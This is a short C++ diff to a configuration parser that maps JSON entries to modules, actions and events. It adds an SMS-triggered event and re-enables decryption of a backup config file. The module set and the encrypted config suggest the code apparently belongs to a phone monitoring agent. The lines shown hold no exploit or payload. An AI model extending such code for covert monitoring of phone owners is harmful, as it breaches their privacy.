@@ -107,7 +107,7 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 			}
 
 			// AddressBook e calendar sono la stessa cosa
-			if (moduleName.compare(L"addressbook") == 0 ) {
+			if (moduleName.compare(L"addressbook") == 0) {
 				startProc = CalendarModule;
 				break;
 			}
@@ -159,7 +159,6 @@ BOOL WINAPI Conf::ParseAction(JSONArray js) {
 		wstring moduleName = jo[L"desc"]->AsString();
 		wprintf(L"Parsing Action: \"%s\"\n", moduleName.c_str());
 #endif
-		wprintf(L"size: %d\n", c->AsArray().size());
 
 		actionsManager->add(i, c->AsArray());
 	}
@@ -242,6 +241,11 @@ BOOL WINAPI Conf::ParseEvent(JSONArray js) {
 				startProc = OnDate;
 				break;
 			}
+
+			if (eventName.compare(L"sms") == 0 ) {
+				startProc = OnSms;
+				break;
+			}
 		} while (0);
 
 		if (startProc != NULL)
@@ -315,8 +319,7 @@ BOOL Conf::LoadConf() {
 	strBack = GetBackupName(FALSE);
 
 	if (strBack.empty() == FALSE && FileExists(strBack)) {
-		// XXX reimplementare
-		//pConf = encryptionObj.DecryptConfOld(strBack, &Len);
+		pConf = encryptionObj.DecryptConf(strBack, &Len);
 
 		Log logInfo;
 
